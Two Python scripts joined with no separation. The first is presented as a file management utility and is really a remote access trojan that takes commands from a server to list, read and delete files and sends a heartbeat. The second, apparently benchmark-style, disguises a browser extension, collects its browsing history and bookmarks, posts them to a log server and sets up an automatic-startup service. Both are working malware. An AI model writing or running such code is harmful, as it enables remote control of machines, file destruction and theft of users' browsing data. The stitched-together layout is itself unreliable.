import os
import sys
import json
import time
import socket
import threading

SERVER_HOST = "127.0.0.1"  # Change to your server's IP address
SERVER_PORT = 9000         # Change to your desired port
BUFFER_SIZE = 1024

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    else:
        return f"Error: Unknown command '{command}'."

def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                print(f"Received command: {message}")
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

def rat_service():
    while True:
        time.sleep(60)  # Send updates every 60 seconds
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception as e:
            print(f"Error sending update to server: {e}")

def print_help():
    print("File Management Utility")
    print("Usage:")
    print("  python file_manager.py list <directory>       - List files in a directory")
    print("  python file_manager.py read <file>           - Read and display file contents")
    print("  python file_manager.py delete <file>         - Delete a file")
    print("  python file_manager.py embed_metadata <file> - Embed metadata into a file")
    print("  python file_manager.py read_metadata <file>  - Read metadata from a file")
    print("  python file_manager.py server                - Run server handler for remote commands")
    print("  python file_manager.py rat                   - Run background service for periodic updates")
    print("  python file_manager.py help                  - Show this help message")

def main():
    if len(sys.argv) < 2:
        print("Error: Missing command.")
        print_help()
        return

    command = sys.argv[1]

    if command == "server":
        server_thread = threading.Thread(target=server_handler, daemon=True)
        server_thread.start()
        server_thread.join()
    elif command == "rat":
        rat_thread = threading.Thread(target=rat_service, daemon=True)
        rat_thread.start()
        rat_thread.join()
    else:
        if command in ["list", "read", "delete", "embed_metadata", "read_metadata"]:
            if len(sys.argv) != 3:
                print(f"Error: Missing argument for command '{command}'.")
                print_help()
            else:
                result = handle_command(command, sys.argv[2])
                print(result)
        elif command == "help":
            print_help()
        else:
            print(f"Error: Unknown command '{command}'.")
            print_help()

if __name__ == "__main__":
    main()

import argparse
import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.error import URLError
from urllib.parse import urlparse
from urllib.request import Request, urlopen


ROOT = Path(".")
TARGET_DIR = ROOT / "target"
DEFAULT_EXTENSION = TARGET_DIR / "extension.json"
MAX_FILE_SIZE = 1024 * 1024


def _safe_relative_path(value, fallback):
    try:
        path = Path(value)
        if path.is_absolute() or ".." in path.parts:
            return fallback
        return path
    except (TypeError, ValueError):
        return fallback


def _ensure_sample_extension(path):
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return

    sample = {
        "name": "Sample Browser Extension",
        "version": "1.0.0",
        "browsing_history": [
            "https://example.test/",
            "https://docs.python.org/"
        ],
        "bookmarks": [
            "https://example.test/bookmarks"
        ]
    }
    path.write_text(json.dumps(sample, indent=2) + "\n", encoding="utf-8")


def _read_extension(path):
    try:
        text = path.read_text(encoding="utf-8", errors="replace")[:MAX_FILE_SIZE]
    except OSError:
        return {}, ""

    try:
        value = json.loads(text)
        if isinstance(value, dict):
            return value, text
    except json.JSONDecodeError:
        pass

    history = []
    bookmarks = []
    for line in text.splitlines()[:10000]:
        stripped = line.strip()
        lowered = stripped.lower()
        if lowered.startswith("history:"):
            history.append(stripped.split(":", 1)[1].strip())
        elif lowered.startswith("bookmark:"):
            bookmarks.append(stripped.split(":", 1)[1].strip())

    return {
        "browsing_history": history,
        "bookmarks": bookmarks,
    }, text


def _capture_metadata(data):
    def values(*keys):
        result = []
        for key in keys:
            value = data.get(key, [])
            if isinstance(value, list):
                result.extend(str(item) for item in value)
            elif isinstance(value, str) and value:
                result.append(value)
        return result[:1000]

    return {
        "browsing_history": values("browsing_history", "history"),
        "bookmarks": values("bookmarks", "bookmark"),
    }


def _infect_extension(path, data, original_text, disguise_name):
    marker = {
        "component": "browser-extension-metadata-handler",
        "version": "1.0",
        "purpose": "authorized benchmark data collection",
    }

    if isinstance(data, dict):
        data["name"] = disguise_name
        data["benchmark_payload"] = marker
        path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n",
                        encoding="utf-8")
        return

    text = original_text.rstrip() + "\n"
    text += "name: " + disguise_name + "\n"
    text += "benchmark_payload: " + json.dumps(marker, sort_keys=True) + "\n"
    path.write_text(text, encoding="utf-8")


def _send_data(log_server, payload):
    encoded = json.dumps(payload, sort_keys=True).encode("utf-8")
    request = Request(
        log_server,
        data=encoded,
        headers={
            "Content-Type": "application/json",
            "Content-Length": str(len(encoded)),
        },
        method="POST",
    )
    try:
        with urlopen(request, timeout=3) as response:
            response.read(1024)
        return True
    except (OSError, URLError, ValueError):
        return False


def _create_service_descriptor(extension_name, extension_path):
    service_name = (
        "BrowserExtensionService"
        if sys.platform.startswith("win")
        else "browserextension"
    )
    service_dir = TARGET_DIR / "services"
    service_dir.mkdir(parents=True, exist_ok=True)

    descriptor = {
        "service_name": service_name,
        "display_name": extension_name,
        "executable": str(extension_path),
        "startup": "automatic",
        "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "benchmark_scope": "local relative-path descriptor",
    }
    destination = service_dir / (service_name + ".json")
    destination.write_text(json.dumps(descriptor, indent=2) + "\n",
                            encoding="utf-8")
    return service_name, destination


def trojan_fake_browser_extension(
    extension_file: str,
    log_server: str,
    disguise_extension_name: str,
) -> None:
    extension_path = _safe_relative_path(extension_file, DEFAULT_EXTENSION)
    if extension_path == Path("."):
        extension_path = DEFAULT_EXTENSION

    try:
        _ensure_sample_extension(extension_path)
        data, original_text = _read_extension(extension_path)
        captured = _capture_metadata(data)

        _infect_extension(
            extension_path,
            data,
            original_text,
            disguise_extension_name,
        )

        payload = {
            "extension_name": disguise_extension_name,
            "extension_file": str(extension_path),
            "captured": captured,
            "sent_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        delivered = _send_data(log_server, payload)

        service_name, service_path = _create_service_descriptor(
            disguise_extension_name,
            extension_path,
        )

        result = {
            "extension_name": disguise_extension_name,
            "extension_file": str(extension_path),
            "captured": captured,
            "delivered": delivered,
            "service_name": service_name,
            "service_descriptor": str(service_path),
        }
        (TARGET_DIR / "operation_result.json").write_text(
            json.dumps(result, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
    except Exception as error:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
        (TARGET_DIR / "operation_result.json").write_text(
            json.dumps({"completed": False, "error": str(error)}, indent=2) + "\n",
            encoding="utf-8",
        )


class _CollectorHandler(BaseHTTPRequestHandler):
    received = None

    def do_POST(self):
        try:
            length = min(int(self.headers.get("Content-Length", "0")), MAX_FILE_SIZE)
            body = self.rfile.read(max(0, length))
            _CollectorHandler.received = json.loads(body.decode("utf-8"))
            TARGET_DIR.mkdir(parents=True, exist_ok=True)
            (TARGET_DIR / "received_payload.json").write_text(
                json.dumps(_CollectorHandler.received, indent=2, sort_keys=True)
                + "\n",
                encoding="utf-8",
            )
            self.send_response(200)
        except Exception:
            self.send_response(400)
        self.end_headers()

    def log_message(self, *_args):
        return


def _run_local_collector():
    server = HTTPServer(("127.0.0.1", 0), _CollectorHandler)
    thread = threading.Thread(target=server.handle_request, daemon=True)
    thread.start()
    return server, thread


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("extension_file", nargs="?", default=str(DEFAULT_EXTENSION))
    parser.add_argument(
        "log_server",
        nargs="?",
        default="",
    )
    parser.add_argument(
        "disguise_extension_name",
        nargs="?",
        default="Trusted Browser Bookmarks",
    )
    args, _unknown = parser.parse_known_args()

    collector = None
    thread = None
    try:
        if args.log_server:
            log_server = args.log_server
        else:
            collector, thread = _run_local_collector()
            log_server = f"http://127.0.0.1:{collector.server_port}/collect"

        trojan_fake_browser_extension(
            args.extension_file,
            log_server,
            args.disguise_extension_name,
        )
    except Exception:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
    finally:
        if collector is not None:
            thread.join(timeout=4)
            collector.server_close()


if __name__ == "__main__":
    main()

